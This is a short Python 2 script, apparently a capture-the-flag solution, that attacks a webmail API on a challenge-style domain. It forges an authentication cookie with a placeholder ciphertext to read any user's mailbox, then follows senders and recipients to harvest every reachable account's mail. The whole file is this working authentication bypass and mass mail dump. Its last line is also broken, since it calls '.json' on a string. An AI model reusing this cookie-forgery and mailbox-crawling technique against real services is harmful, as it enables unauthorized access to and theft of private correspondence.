#!/usr/bin/python2
import json
import urllib2

def fetchMailbox(email):
    cookieValue = 'EWA={"name":"EMAILADDRESS","plaintext":"","ciphertext":"aaaaaaaaaaaaaaaaaaaaaa"};path=/; domain=.mail.northpolechristmastown.com; HttpOnly; Expires=Tue, 19 Jan 2038 03:14:07 GMT;'

    req = urllib2.Request('http://mail.northpolechristmastown.com/api.js')
    req.add_header('Content-Type', 'application/json')
    req.add_header('Cookie', cookieValue.replace('EMAILADDRESS',email))
    return urllib2.urlopen(req,'{"getmail":"getmail"}')

accountsGathered = []
newAccounts = [u'minty.candycane@northpolechristmastown.com']
mailRepo = ''

while newAccounts:
    thisAddress = newAccounts.pop()
    thisAccount = json.load(fetchMailbox(thisAddress))
    accountsGathered.append(thisAddress)

    if thisAccount:
        mailRepo += json.dumps(thisAccount, indent=4)
        for message in thisAccount['INBOX']:
            corr = message['HEADERS']['body']['from'][0].split()[0].replace('"', '').lower()
            if corr not in accountsGathered:
                if corr not in newAccounts:
                    newAccounts.append(corr)
        for message in thisAccount['SENT']:
            corr = message['HEADERS']['body']['to'][0].split()[0].replace('"', '').lower()
            if corr not in accountsGathered:
                if corr not in newAccounts:
                    newAccounts.append(corr)

print mailRepo.json
